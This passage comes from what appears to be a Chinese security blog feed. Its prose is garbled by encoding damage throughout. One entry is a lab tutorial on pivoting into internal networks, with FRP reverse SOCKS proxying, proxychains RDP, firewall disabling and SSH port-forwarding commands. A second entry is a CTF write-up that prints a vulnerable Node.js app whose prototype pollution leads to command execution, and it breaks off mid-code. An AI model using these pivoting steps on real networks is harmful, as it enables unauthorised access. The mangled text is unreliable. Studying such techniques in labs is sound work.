alt="image-20240325164452772"></p><blockquote><p>ä¹¦ä¸­æ­å»ºäº†ä¸‰çº§ä»£ç†ï¼Œè¿™é‡Œæ¥è¯´ä¸€ä¸‹å¤šçº§ä»£ç†çš„æ„æ€</p><p>é¦–å…ˆæ§åˆ¶äº†WinServer2012è¿™å°ä¸»æœºï¼Œç„¶åä¸Šä¼ frpå®¢æˆ·ç«¯ï¼Œæ”»å‡»è€…ç”¨ä¸€å°vpsä½œä¸ºæœåŠ¡ç«¯ï¼Œè¿™æ ·å°±å¯ä»¥è®¿é—®åˆ°WinServer2012æœåŠ¡å™¨ï¼Œæ­¤æ—¶å°±æ„å»ºäº†ä¸€å±‚ä»£ç†ã€‚</p><p>ç„¶ååœ¨WinServer2012èµ·ä¸€ä¸ªfrpæœåŠ¡ç«¯ï¼Œä¸Šä¼ frpå®¢æˆ·ç«¯åˆ°åŠå…¬åŒºçš„æœåŠ¡ç«¯ï¼Œç„¶åå†æ„å»ºä¸€çº§ä»£ç†ï¼Œè¿™æ ·æ”»å‡»è€…å°±èƒ½è·³ä¸¤æ¬¡è®¿é—®åˆ°åŠå…¬åŒºï¼Œè¿™å°±æ˜¯äºŒçº§ä»£ç†ï¼Œåé¢ä¸€æ¬¡ç±»æ¨</p></blockquote><p>è¿™é‡Œæˆ‘åªèƒ½å¤ç°ä»–çš„ä¸€çº§ä»£ç†äº†ï¼Œæ²¡é‚£ä¹ˆå¤šçš„æœåŠ¡å™¨ã€‚æˆ‘è¿™é‡Œç”¨ä¸€å°kaliæœºå™¨ï¼Œä¸€å°Win7ï¼Œä¸€å°WinServer2012æ¥å®éªŒï¼›</p><p>Win7æœ‰ä¸¤å¼ ç½‘å¡ï¼Œå¯ä»¥è¿æ¥å¤„äºå†…ç½‘çš„WinServer2012</p><p><strong>Win7ï¼š</strong></p><p><img src="http://cdn.clown2024.cn/202407151711908.png" alt="image-20240414104302628"></p><p><strong>WinServer2012</strong></p><p><img src="http://cdn.clown2024.cn/202407151711909.png" alt="image-20240414104340318"></p><p>å‡è®¾ç°åœ¨å·²ç»æ§åˆ¶äº†Win7ï¼Œæˆ‘ä»¬å°±å¯ä»¥å…ˆæ­å»ºä¸€çº§ä»£ç†æ¥è®¿é—®WinServer2012</p><ol><li><p>ä½¿ç”¨kaliæœºå™¨ä½œä¸ºFRPçš„æœåŠ¡ç«¯ï¼Œæ‰§è¡Œä¸‹é¢å‘½ä»¤ï¼š</p><figure class="highlight shell"><table><tr><td class="code"><pre><code class="hljs shell">./frps -c ./frps.ini<br></code></pre></td></tr></table></figure><p>é…ç½®æ–‡ä»¶å¦‚ä¸‹ï¼š</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">bind_addr = 192.168.172.132 #æœåŠ¡å™¨ip<br>bind_port = 7000  # æœåŠ¡å™¨ä¸Šç»‘å®šçš„ç«¯å£<br></code></pre></td></tr></table></figure><p><img src="http://cdn.clown2024.cn/202407151711910.png" alt="image-20240414110044664"></p><p>å¯ä»¥çœ‹åˆ°å·²ç»æˆåŠŸå¯åŠ¨äº†</p></li><li><p>ç°åœ¨ä½¿ç”¨Win7è¿™å°æœºå™¨è¿›è¡Œé…ç½®</p><p>ç„¶åæ‰§è¡Œä¸‹é¢å‘½ä»¤ï¼š</p><figure class="highlight shell"><table><tr><td class="code"><pre><code class="hljs shell">.\frpc.exe -c .\frpc.ini<br></code></pre></td></tr></table></figure><p>é…ç½®æ–‡ä»¶å¦‚ä¸‹ï¼š</p><p><img src="http://cdn.clown2024.cn/202407151711911.png" alt="image-20240414110253513"></p><blockquote><p>server_addræŒ‡å‘FRPæœåŠ¡ç«¯ç»‘å®šçš„IPåœ°å€</p><p>server_portæŒ‡å‘FRPæœåŠ¡ç«¯ç»‘å®šçš„ç«¯å£</p><p>remote_portä¸ºä»£ç†æ‰€ä½¿ç”¨çš„ç«¯å£ï¼Œä¼šè¢«è½¬å‘åˆ°æœåŠ¡ç«¯</p><p>pluginä¸ºä»£ç†çš„ç±»å‹</p></blockquote><p><img src="http://cdn.clown2024.cn/202407151711912.png" alt="image-20240414110339382"></p></li></ol><p>ç°åœ¨å°±æˆåŠŸæ­å»ºäº†ä¸€çº§ä»£ç†ï¼Œå¯ä»¥çœ‹åˆ°socksä»£ç†è¿æ¥æˆåŠŸ</p><p><img src="http://cdn.clown2024.cn/202407151711913.png" alt="image-20240414110437717"></p><p>çœ‹ä¸€ä¸‹æ”»å‡»æœºå¼€æ”¾çš„ç«¯å£</p><p><img src="http://cdn.clown2024.cn/202407151711914.png" alt="image-20240414112044521"></p><p>ç„¶åï¼Œå€ŸåŠ©ç¬¬ä¸‰æ–¹å·¥å…·ï¼Œå¯ä»¥è®©è®¡ç®—æœºçš„å…¶ä»–åº”ç”¨ä½¿ç”¨è¿™ä¸ª SOCKS5 ä»£ç†,å¦‚ProxyChainsã€Proxifier ç­‰ã€‚è¿™é‡Œä»¥ ProxyChains ä¸ºä¾‹è¿›è¡Œæ¼”ç¤º(ProxyChains æ˜¯ä¸€æ¬¾å¯ä»¥åœ¨ Linux ä¸‹å®ç°å…¨å±€ä»£ç†çš„è½¯ä»¶ï¼Œå¯ä»¥ä½¿ä»»ä½•åº”ç”¨ç¨‹åºé€šè¿‡ä»£ç†ä¸Šç½‘ï¼Œå…è®¸TCPå’Œ DNS æµé‡é€šè¿‡ä»£ç†éš§é“ï¼Œæ”¯æŒHTTPã€SOCKS4ã€SOCK5ç±»å‹ä»£ç†)ã€‚</p><p>kaliä¸Šç›´æ¥ä½¿ç”¨ä¸‹é¢å‘½ä»¤å®‰è£…å³å¯ï¼š</p><figure class="highlight shell"><table><tr><td class="code"><pre><code class="hljs shell">sudo apt install proxychains4<br></code></pre></td></tr></table></figure><p>å‚è€ƒæ–‡ç« ï¼š<a href="https://www.kali.org/tools/proxychains-ng/">https://www.kali.org/tools/proxychains-ng/</a></p><p>å®‰è£…ä¹‹åæˆ‘ä»¬å¯ä»¥å»é…ç½®&#x2F;etcä¸‹çš„proxychains.confé…ç½®æ–‡ä»¶è®¾ç½®ä»£ç†ï¼Œæœ€å¼€å§‹çš„socksè®°å¾—è¦æ³¨é‡Šæ‰ï¼Œå› ä¸ºæ˜¯æŒ‰é¡ºåºèµ°ä»£ç†çš„ã€‚</p><p><img src="http://cdn.clown2024.cn/202407151711915.png" alt="image-20240414111433628"></p><p>ç„¶åä½¿ç”¨ä¸‹é¢å‘½ä»¤å»è¿œç¨‹è¿æ¥WinServer2012ï¼Œæˆ‘ä»¬æƒ³è¦å‘½ä»¤æˆ–åº”ç”¨ä½¿ç”¨ä»£ç†åªéœ€è¦åœ¨æœ€å‰é¢åŠ ä¸Š<code>proxychains4</code>æˆ–è€…<code>proxychains</code>å³å¯</p><figure class="highlight shell"><table><tr><td class="code"><pre><code class="hljs shell">proxychains rdesktop 192.168.30.10<br></code></pre></td></tr></table></figure><p><img src="http://cdn.clown2024.cn/202407151711916.png" alt="image-20240414114656744"></p><blockquote><p>ä¸è¿‡ä¸€å¼€å§‹ç»å¸¸è¿æ¥è¶…æ—¶ï¼Œåæ¥ç›´æ¥æŠŠé˜²ç«å¢™å…³äº†å°±æˆåŠŸäº†</p></blockquote><h2 id="sshéš§é“"><a href="#SSHéš§é“" class="headerlink" title="SSHéš§é“"></a>SSHéš§é“</h2><p>å‚è€ƒæ–‡ç« ï¼š<a href="https://www.cnblogs.com/sfsec/p/15534100.html">https://www.cnblogs.com/sfsec/p/15534100.html</a></p><p>åœ¨å†…ç½‘ä¸­å‡ ä¹æ‰€æœ‰çš„LinuxæœåŠ¡å™¨éƒ½æ”¯æŒSSHåè®®ï¼Œæ‰€ä»¥SSHéš§é“ä¹Ÿæ˜¯ä¸€ç§éå¸¸å¸¸è§çš„éš§é“æŠ€æœ¯</p><p>ä¸€èˆ¬æˆ‘ä»¬åˆ©ç”¨SSHå®¢æˆ·ç«¯å»è¿æ¥æœåŠ¡ç«¯å‘½ä»¤å¦‚ä¸‹</p><figure class="highlight shell"><table><tr><td class="code"><pre><code class="hljs shell">ssh root@192.168.1.1<br></code></pre></td></tr></table></figure><p>ä¸‹é¢æ˜¯æ­å»ºSSHéš§é“å¸¸ç”¨çš„å‚æ•°ï¼š</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">-fï¼šåå°è¿è¡Œssh<br>-Nï¼šå®‰é™çš„å»ºç«‹è¿æ¥ï¼ˆå¯ä»¥å»ºç«‹è¿æ¥ä¸”çœ‹ä¸åˆ°ä¼šè¯ï¼‰<br>-Cï¼šå‹ç¼©ä¼ è¾“ï¼Œæé«˜ä¼ è¾“é€Ÿåº¦<br>-gï¼šå…è®¸è¿œç¨‹ä¸»æœºè¿æ¥æœ¬åœ°ç”¨äºè½¬å‘çš„ç«¯å£<br>-Lï¼šæœ¬åœ°ç«¯å£è½¬å‘<br>-Rï¼šè¿œç¨‹ç«¯å£è½¬å‘<br>-Dï¼šåŠ¨æ€è½¬å‘<br>-pï¼šæŒ‡å®šsshç«¯å£<br></code></pre></td></tr></table></figure><p><strong>æœ¬åœ°è½¬å‘</strong></p><p>å€ŸåŠ©æ–‡ç« çš„ç½‘ç»œæ‹“æ‰‘å›¾</p><p><img src="http://cdn.clown2024.cn/202407151711917.png" alt="image-20240424232040689"></p><p>ç°åœ¨çš„æƒ…å½¢å°±æ˜¯æ”»å‡»è€…èƒ½å¤Ÿè®¿é—®åˆ°target1ä½†æ˜¯è®¿é—®ä¸åˆ°target2ï¼Œé‚£ä¹ˆæˆ‘ä»¬å°±åˆ©ç”¨target1ä¸ºè·³æ¿æœºï¼Œå°†target2ä¸Šçš„æµé‡è½¬å‘åˆ°è·³æ¿æœºä¸Šï¼Œæ¯”å¦‚è¿™é‡Œè½¬å‘target2çš„ç«¯å£</p><figure class="highlight shell"><table><tr><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">#</span><span class="language-bash">ssh -CfNg -L (æœ¬åœ°ç«¯å£):(ç›®æ ‡ä¸»æœºip):(ç›®æ ‡ä¸»æœºç«¯å£) (è·³æ¿æœºç”¨æˆ·å)@(è·³æ¿æœºip) -p (è·³æ¿æœºç«¯å£)</span><br>ssh -CfNg -L 6666:192.168.239.129:22 root@192.168.178.142  <br></code></pre></td></tr></table></figure><p>ç„¶åè¾“å…¥target1çš„å¯†ç å³å¯</p><p>ç„¶åæˆ‘ä»¬ç”¨sshè¿æ¥6666ç«¯å£å°±å¯ä»¥æˆåŠŸè¿æ¥åˆ°target2çš„sshæœåŠ¡äº†</p><p>å½“é¶æœºä¸å‡ºç½‘åšä¸äº†frpä»£ç†çš„æ—¶å€™å¯ä»¥ç”¨sshéš§é“æœ¬åœ°è½¬å‘</p><p><strong>è¿œç¨‹è½¬å‘</strong></p><p>è¿œç¨‹è½¬å‘é€‚ç”¨äºå¤–ç½‘è®¿é—®ä¸åˆ°å†…ç½‘è®¾å¤‡ï¼Œä½†æ˜¯å†…ç½‘å¯ä»¥è®¿é—®åˆ°æœ¬åœ°çš„å¤–ç½‘VPSè®¾å¤‡ã€‚</p><p>è¿™é‡Œä»¥target1ä¸ºè·³æ¿æœºï¼Œå°†kaliçš„4444ç«¯å£æµé‡è½¬å‘åˆ°target2çš„22ç«¯å£ä¸Šï¼Œç„¶åè®¿é—®kaliçš„4444ç«¯å£å°±å¯ä»¥åˆ°è¾¾target2çš„22ç«¯å£ï¼š</p><figure class="highlight shell"><table><tr><td class="code"><pre><code class="hljs shell">ssh -CfNg -R 4444:192.168.239.129:22 root@192.168.178.128  #4444ä¸ºkaliå¤–ç½‘VPSç«¯å£<br></code></pre></td></tr></table></figure><p>ç„¶åè¾“å…¥kaliçš„è´¦å·å¯†ç å³å¯</p><h2 id="icmpéš§é“"><a href="#ICMPéš§é“" class="headerlink" title="ICMPéš§é“"></a>ICMPéš§é“</h2><p>å‚è€ƒæ–‡ç« ï¼š<a href="https://blog.csdn.net/weixin_44268918/article/details/131069608">https://blog.csdn.net/weixin_44268918/article/details/131069608</a></p><p>è¿™ç¯‡æ–‡ç« æ¶µç›–äº†å¤§éƒ¨åˆ†çš„éš§é“æŠ€æœ¯</p><p>ä¸€äº›å¸¸è§åè®®å±‚çš„éš§é“</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">åº”ç”¨å±‚ï¼šSSHéš§é“ã€HTTP/Séš§é“ã€DNSéš§é“<br>ä¼ è¾“å±‚ï¼šTCPéš§é“ã€UDPéš§é“<br>ç½‘ç»œå±‚ï¼šIPv6éš§é“ã€ICMPéš§é“<br></code></pre></td></tr></table></figure><p>åè®®æ˜¯å‘ä¸‹å…¼å®¹çš„ï¼Œå¦‚æœTCPåè®®è¢«ç¦ç”¨äº†ï¼Œé‚£ä¹ˆåŸºäºTCPåè®®çš„HTTP&#x2F;Sä¹Ÿç”¨ä¸äº†äº†</p><h3 id="icmpshå·¥å…·"><a href="#icmpshå·¥å…·" class="headerlink" title="icmpshå·¥å…·"></a>icmpshå·¥å…·</h3><p>è¿™é‡Œç”¨åˆ°ä¸€ä¸ªicmpshå·¥å…·ï¼ŒGitHubåœ°å€ï¼š<a href="https://github.com/bdamele/icmpsh">https://github.com/bdamele/icmpsh</a></p><h3 id="pingtunnelå·¥å…·"><a href="#pingTunnelå·¥å…·" class="headerlink" title="pingTunnelå·¥å…·"></a>pingTunnelå·¥å…·</h3><p>é¡¹ç›®åœ°å€ï¼š<a href="https://github.com/esrrhs/pingtunnel">https://github.com/esrrhs/pingtunnel</a></p><p>è¯¥å·¥å…·åšicmpéš§é“ä¼šè¾ƒä¸ºæ–¹ä¾¿</p>]]></content>
      
      
      <categories>
          
          <category> å†…ç½‘æ¸—é€ </category>
          
      </categories>
      
      
        <tags>
            
            <tag> å†…ç½‘æ¸—é€ </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Nssctfåˆ·é¢˜-ç½‘é¼æ¯</title>
      <link href="/2024/03/20/Nssctf%E5%88%B7%E9%A2%98-%E7%BD%91%E9%BC%8E%E6%9D%AF/"/>
      <url>/2024/03/20/Nssctf%E5%88%B7%E9%A2%98-%E7%BD%91%E9%BC%8E%E6%9D%AF/</url>
      
        <content type="html"><![CDATA[<h1 id="ç½‘é¼æ¯-2020é’é¾™ç»„notes"><a href="#ç½‘é¼æ¯-2020é’é¾™ç»„-Notes" class="headerlink" title="[ç½‘é¼æ¯ 2020é’é¾™ç»„]Notes"></a>[ç½‘é¼æ¯ 2020é’é¾™ç»„]Notes</h1><p>è¿™é‡Œæ²¡ç»™é¢˜ç›®æºç åªèƒ½ç½‘ä¸Šæ‰¾ï¼Œapp.jsæºç å¦‚ä¸‹ï¼š</p><figure class="highlight js"><table><tr><td class="code"><pre><code class="hljs js"><span class="hljs-keyword">var</span> express = <span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;express&#x27;</span>);<br><span class="hljs-keyword">var</span> path = <span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;path&#x27;</span>);<br><span class="hljs-keyword">const</span> undefsafe = <span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;undefsafe&#x27;</span>);<br><span class="hljs-keyword">const</span> &#123; exec &#125; = <span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;child_process&#x27;</span>);<br><br><br><span class="hljs-keyword">var</span> app = <span class="hljs-title function_">express</span>();<br><span class="hljs-keyword">class</span> <span class="hljs-title class_">Notes</span> &#123;<br>    <span class="hljs-title function_">constructor</span>(<span class="hljs-params"></span>) &#123;<br>        <span class="hljs-variable language_">this</span>.<span class="hljs-property">owner</span> = <span class="hljs-string">&quot;whoknows&quot;</span>;<br>        <span class="hljs-variable language_">this</span>.<span class="hljs-property">num</span> = <span class="hljs-number">0</span>;<br>        <span class="hljs-variable language_">this</span>.<span class="hljs-property">note_list</span> = &#123;&#125;;<br>    &#125;<br><br>    <span class="hljs-title function_">write_note</span>(<span class="hljs-params">author, raw_note</span>) &#123;<br>        <span class="hljs-variable language_">this</span>.<span class="hljs-property">note_list</span>[(<span class="hljs-variable language_">this</span>.<span class="hljs-property">num</span>++).<span class="hljs-title function_">toString</span>()] = &#123;<span class="hljs-string">&quot;author&quot;</span>: author,<span class="hljs-string">&quot;raw_note&quot;</span>:raw_note&#125;;<br>    &#125;<br><br>    <span class="hljs-title function_">get_note</span>(<span class="hljs-params">id</span>) &#123;<br>        <span class="hljs-keyword">var</span> r = &#123;&#125;<br>        <span class="hljs-title function_">undefsafe</span>(r, id, <span class="hljs-title function_">undefsafe</span>(<span class="hljs-variable language_">this</span>.<span class="hljs-property">note_list</span>, id));<br>        <span class="hljs-keyword">return</span> r;<br>    &#125;<br><br>    <span class="hljs-title function_">edit_note</span>(<span class="hljs-params">id, author, raw</span>) &#123; <br>        <span class="hljs-title function_">undefsafe</span>(<span class="hljs-variable language_">this</span>.<span class="hljs-property">note_list</span>, id + <span class="hljs-string">&#x27;.author&#x27;</span>, author);<br>        <span class="hljs-title function_">undefsafe</span>(<span class="hljs-variable language_">this</span>.<span class="hljs-property">note_list</span>, id + <span class="hljs-string">&#x27;.raw_note&#x27;</span>, raw);<br>    &#125;<br><br>    <span class="hljs-title function_">get_all_notes</span>(<span class="hljs-params"></span>) &#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-variable language_">this</span>.<span class="hljs-property">note_list</span>;<br>    &#125;<br><br>    <span class="hljs-title function_">remove_note</span>(<span class="hljs-params">id</span>) &#123;<br>        <span class="hljs-keyword">delete</span> <span class="hljs-variable language_">this</span>.<span class="hljs-property">note_list</span>[id];<br>    &#125;<br>&#125;<br><br><span class="hljs-keyword">var</span> notes = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Notes</span>();<br>notes.<span class="hljs-title function_">write_note</span>(<span class="hljs-string">&quot;nobody&quot;</span>, <span class="hljs-string">&quot;this is nobody&#x27;s first note&quot;</span>);<br><br><br>app.<span class="hljs-title function_">set</span>(<span class="hljs-string">&#x27;views&#x27;</span>, path.<span class="hljs-title function_">join</span>(__dirname, <span class="hljs-string">&#x27;views&#x27;</span>));<br>app.<span class="hljs-title function_">set</span>(<span class="hljs-string">&#x27;view engine&#x27;</span>, <span class="hljs-string">&#x27;pug&#x27;</span>);<br><br>app.<span class="hljs-title function_">use</span>(express.<span class="hljs-title function_">json</span>());<br>app.<span class="hljs-title function_">use</span>(express.<span class="hljs-title function_">urlencoded</span>(&#123; <span class="hljs-attr">extended</span>: <span class="hljs-literal">false</span> &#125;));<br>app.<span class="hljs-title function_">use</span>(express.<span class="hljs-title function_">static</span>(path.<span class="hljs-title function_">join</span>(__dirname, <span class="hljs-string">&#x27;public&#x27;</span>)));<br><br><br>app.<span class="hljs-title function_">get</span>(<span class="hljs-string">&#x27;/&#x27;</span>, <span class="hljs-keyword">function</span>(<span class="hljs-params">req, res, next</span>) &#123;<br>  res.<span class="hljs-title function_">render</span>(<span class="hljs-string">&#x27;index&#x27;</span>, &#123; <span class="hljs-attr">title</span>: <span class="hljs-string">&#x27;Notebook&#x27;</span> &#125;);<br>&#125;);<br><br>app.<span class="hljs-title function_">route</span>(<span class="hljs-string">&#x27;/add_note&#x27;</span>)<br>    .<span class="hljs-title function_">get</span>(<span class="hljs-keyword">function</span>(<span class="hljs-params">req, res</span>) &#123;<br>        res.<span class="hljs-title function_">render</span>(<span class="hljs-string">&#x27;mess&#x27;</span>, &#123;<span class="hljs-attr">message</span>: <span class="hljs-string">&#x27;please use POST to add a note&#x27;</span>&#125;);<br>    &#125;)<br>    .<span class="hljs-title function_">post</span>(<span class="hljs-keyword">function</span>(<span class="hljs-params">req, res</span>) &#123;<br>        <span class="hljs-keyword">let</span> author = req.<span class="hljs-property">body</span>.<span class="hljs-property">author</span>;<br>        <span class="hljs-keyword">let</span> raw = req.<span class="hljs-property">body</span>.<span class="hljs-property">raw</span>;<br>        <span class="hljs-keyword">if</span> (author &amp;&amp; raw) &#123;<br>            notes.<span class="hljs-title function_">write_note</span>(author, raw);<br>            res.<span class="hljs-title function_">render</span>(<span class="hljs-string">&#x27;mess&#x27;</span>, &#123;<span class="hljs-attr">message</span>: <span class="hljs-string">&quot;add note sucess&quot;</span>&#125;);<br>        &#125; <span class="hljs-keyword">else</span> &#123;<br>            res.<span class="hljs-title function_">render</span>(<span class="hljs-string">&#x27;mess&#x27;</span>, &#123;<span class="hljs-attr">message</span>: <span class="hljs-string">&quot;did not add note&quot;</span>&#125;);<br>        &#125;<br>    &#125;)<br><br>app.<span class="hljs-title function_">route</span>(<span class="hljs-string">&#x27;/edit_note&#x27;</span>)<br>    .<span class="hljs-title function_">get</span>(<span class="hljs-keyword">function</span>(<span class="hljs-params">req, res</span>) &#123;<br>        res.<span class="hljs-title function_">render</span>(<span class="hljs-string">&#x27;mess&#x27;</span>, &#123;<span class="hljs-attr">message</span>: <span class="hljs-string">&quot;please use POST to edit a note&quot;</span>&#125;);<br>    &#125;)<br>    .<span class="hljs-title function_">post</span>(<span class="hljs-keyword">function</span>(<span class="hljs-params">req, res</span>) &#123;<br>        <span class="hljs-keyword">let</span> id = req.<span class="hljs-property">body</span>.<span class="hljs-property">id</span>;<br>        <span class="hljs-keyword">let</span> author = req.<span class="hljs-property">body</span>.<span class="hljs-property">author</span>;<br>        <span class="hljs-keyword">let</span> enote = req.<span class="hljs-property">body</span>.<span class="hljs-property">raw</span>;<br>        <span class="hljs-keyword">if</span> (id &amp;&amp; author &amp;&amp; enote) &#123;<br>            notes.<span class="hljs-title function_">edit_note</span>(id, author, enote);<br>            res.<span class="hljs-title function_">render</span>(<span class="hljs-string">&#x27;mess&#x27;</span>, &#123;<span class="hljs-attr">message</span>: <span class="hljs-string">&quot;edit note sucess&quot;</span>&#125;);<br>        &#125; <span class="hljs-keyword">else</span> &#123;<br>            res.<span class="hljs-title function_">render</span>(<span class="hljs-string">&#x27;mess&#x27;</span>, &#123;<span class="hljs-attr">message</span>: <span class="hljs-string">&quot;edit note failed&quot;</span>&#125;);<br>        &#125;<br>    &#125;)<br><br>app.<span class="hljs-title function_">route</span>(<span class="hljs-string">&#x27;/delete_note&#x27;</span>)<br>    .<span class="hljs-title function_">get</span>(<span class="hljs-keyword">function</span>(<span class="hljs-params">req, res</span>) &#123;<br>        res.<span class="hljs-title function_">render</span>(<span class="hljs-string">&#x27;mess&#x27;</span>, &#123;<span class="hljs-attr">message</span>: <span class="hljs-string">&quot;please use POST to delete a note&quot;</span>&#125;);<br>    &#125;)<br>    .<span class="hljs-title function_">post</span>(<span class="hljs-keyword">function</span>(<span class="hljs-params">req, res</span>) &#123;<br>        <span class="hljs-keyword">let</span> id = req.<span class="hljs-property">body</span>.<span class="hljs-property">id</span>;<br>        <span class="hljs-keyword">if</span> (id) &#123;<br>            notes.<span class="hljs-title function_">remove_note</span>(id);<br>            res.<span class="hljs-title function_">render</span>(<span class="hljs-string">&#x27;mess&#x27;</span>, &#123;<span class="hljs-attr">message</span>: <span class="hljs-string">&quot;delete done&quot;</span>&#125;);<br>        &#125; <span class="hljs-keyword">else</span> &#123;<br>            res.<span class="hljs-title function_">render</span>(<span class="hljs-string">&#x27;mess&#x27;</span>, &#123;<span class="hljs-attr">message</span>: <span class="hljs-string">&quot;delete failed&quot;</span>&#125;);<br>        &#125;<br>    &#125;)<br><br>app.<span class="hljs-title function_">route</span>(<span class="hljs-string">&#x27;/notes&#x27;</span>)<br>    .<span class="hljs-title function_">get</span>(<span class="hljs-keyword">function</span>(<span class="hljs-params">req, res</span>) &#123;<br>        <span class="hljs-keyword">let</span> q = req.<span class="hljs-property">query</span>.<span class="hljs-property">q</span>;<br>        <span class="hljs-keyword">let</span> a_note;<br>        <span class="hljs-keyword">if</span> (<span class="hljs-title function_">typeof</span>(q) === <span class="hljs-string">&quot;undefined&quot;</span>) &#123;<br>            a_note = notes.<span class="hljs-title function_">get_all_notes</span>();<br>        &#125; <span class="hljs-keyword">else</span> &#123;<br>            a_note = notes.<span class="hljs-title function_">get_note</span>(q);<br>        &#125;<br>        res.<span class="hljs-title function_">render</span>(<span class="hljs-string">&#x27;note&#x27;</span>, &#123;<span class="hljs-attr">list</span>: a_note&#125;);<br>    &#125;)<br><br>app.<span class="hljs-title function_">route</span>(<span class="hljs-string">&#x27;/status&#x27;</span>)<br>    .<span class="hljs-title function_">get</span>(<span class="hljs-keyword">function</span>(<span class="hljs-params">req, res</span>) &#123;<br>        <span class="hljs-keyword">let</span> commands = &#123;<br>            <span class="hljs-string">&quot;script-1&quot;</span>: <span class="hljs-string">&quot;uptime&quot;</span>,<br>            <span class="hljs-string">&quot;script-2&quot;</span>: <span class="hljs-string">&quot;free -m&quot;</span><br>        &#125;;<br>        <span class="hljs-keyword">for</span> (<span class="hljs-keyword">let</span> index <span class="hljs-keyword">in</span> commands) &#123;<br>            <span class="hljs-title function_">exec</span>(commands[index], &#123;<span class="hljs-attr">shell</span>:<span class="hljs-string">&#x27;/bin/bash&#x27;</span>&#125;, <span class="hljs-function">(<span class="hljs-params">err, stdout, stderr</span>) =&gt;</span> &#123;<br>                <span class="hljs-keyword">if</span> (err) &#123;<br>                    <span class="hljs-keyword">return</span>;<br>                &#125;<br>                <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">`stdout: <span class="hljs-subst">$&#123;stdout&#125;</span>`</span>);<br>            &#125;);<br>        &#125;<br>        res.<span class="hljs-title function_">send</span>(<span class="hljs-string">&#x27;OK&#x27;</span>);<br>        res.<span class="hljs-title function_">end</span>();<br>    &#125;)<br><br><br>app.<span class="hljs-title function_">use</span>(<span class="hljs-keyword">function</span>(<span class="hljs-params">req, res, next</span>) &#123;<br>  res.<span class="hljs-title function_">status</span>(<span class="hljs-number">404</span>).<span class="hljs-title function_">send</span>(<span class="hljs-string">&#x27;Sorry cant find that!&#x27;</span>);<br>&#125;);<br><br><br>app.<span class="hljs-title function_">use</span>(<span class="hljs-keyword">function</span>(<span class="hljs-params">err, req, res, next</span>) &#123;<br>  <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">error</span>(err.<span class="hljs-property">stack</span>);<br>  res.<span class="hljs-title function_">status</span>(<span class="hljs-number">500</span>).<span class="hljs-title function_">send</span>(<span class="hljs-string">&#x27;Something broke!&#x27;</span>);<br>&#125;);<br><br><br><span class="hljs-keyword">const</span> port = <span class="hljs-number">8080</span>;<br>app.<span class="hljs-title function_">listen</span>(port, <span class="hljs-function">() =&gt;</span> <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">`Example app listening at http://localhost:<span class="hljs-subst">$&#123;port&#125;</span>`</span>))<br></code></pre></td></tr></table></figure><p>å¤§æ¦‚å®¡äº†ä¸€éä¹‹åå°±ä¼šçŸ¥é“ï¼Œåœ¨&#x2F;statusè·¯ç”±é‡Œé¢æ‰§è¡Œäº†å‘½ä»¤ï¼Œåªè¦èƒ½å¤Ÿæ±¡æŸ“commandsé‡Œé¢çš„å±æ€§å°±èƒ½rceï¼Œæ¥ä¸‹æ¥å°±è¦å»çœ‹çœ‹æ€ä¹ˆæ ·æ‰èƒ½æ±¡æŸ“è¿™ä¸ªå±æ€§ã€‚</p><p>çœ‹äº†ä¸€ä¸‹åªæœ‰undefsafeè¿™ä¸ªæ¨¡å—èƒ½å¤Ÿä¿®æ”¹å¯¹è±¡çš„å±æ€§ï¼Œæœäº†ä¸€ä¸‹è¯¥æ¨¡å—åœ¨ä½ç‰ˆæœ¬å­˜åœ¨åŸå‹é“¾æ±¡æŸ“æ¼æ´ï¼Œå…ˆæ¥äº†è§£ä¸€ä¸‹undefsafeæ¨¡å—</p><blockquote><p><code>undefsafe</code> æ˜¯ä¸€ä¸ªç”¨äºå®‰å…¨åœ°è®¿é—®å¯¹è±¡å±æ€§çš„åº“ã€‚å®ƒæä¾›äº†ä¸€ç§å®‰å…¨çš„æ–¹æ³•æ¥è®¿é—®åµŒå¥—åœ¨å¯¹è±¡ä¸­çš„å±æ€§ï¼Œè€Œä¸ä¼šå¯¼è‡´é”™è¯¯ã€‚è¿™åœ¨å¤„ç†å¯èƒ½ä¸å­˜åœ¨çš„å±æ€§æ—¶éå¸¸æœ‰ç”¨ï¼Œå› ä¸ºå®ƒå¯ä»¥é¿å…æŠ›å‡ºå¼‚å¸¸ï¼Œä½†å…¶åœ¨ä½ç‰ˆæœ¬ï¼ˆ&lt; 2.0.3ï¼‰ä¸­å­˜åœ¨åŸå‹é“¾æ±¡æŸ“æ¼æ´ã€‚</p></blockquote><p>ä¸‹é¢æ˜¯å‡ ä¸ªä¾‹å­ï¼š</p><figure class="highlight js"><table><tr><td class="code"><pre><code class="hljs js"><span class="hljs-keyword">const</span> undefsafe = <span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;undefsafe&#x27;</span>);<br><br><span class="hljs-keyword">const</span> obj = &#123;<br>  <span class="hljs-attr">a</span>: &#123;<br>    <span class="hljs-attr">b</span>: &#123;<br>      <span class="hljs-attr">c</span>: <span class="hljs-number">3</span><br>    &#125;<br>  &#125;<br>&#125;;<br><br><span class="hljs-keyword">const</span> result = <span class="hljs-title function_">undefsafe</span>(obj, <span class="hljs-string">&#x27;a.b.c&#x27;</span>);<br><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(result); <span class="hljs-comment">// è¾“å‡ºï¼š3</span><br></code></pre></td></tr></table></figure><figure class="highlight js"><table><tr><td class="code"><pre><code class="hljs js"><span class="hljs-keyword">const</span> undefsafe=<span class="hljs-built_in">require</span>(<span class="hljs-string">&quot;undefsafe&quot;</span>);<br><span class="hljs-keyword">const</span> obj=&#123;<br>    <span class="hljs-attr">a</span>:&#123;<br>        <span class="hljs-attr">b</span>:&#123;<br>            <span class="hljs-attr">c</span>:<span 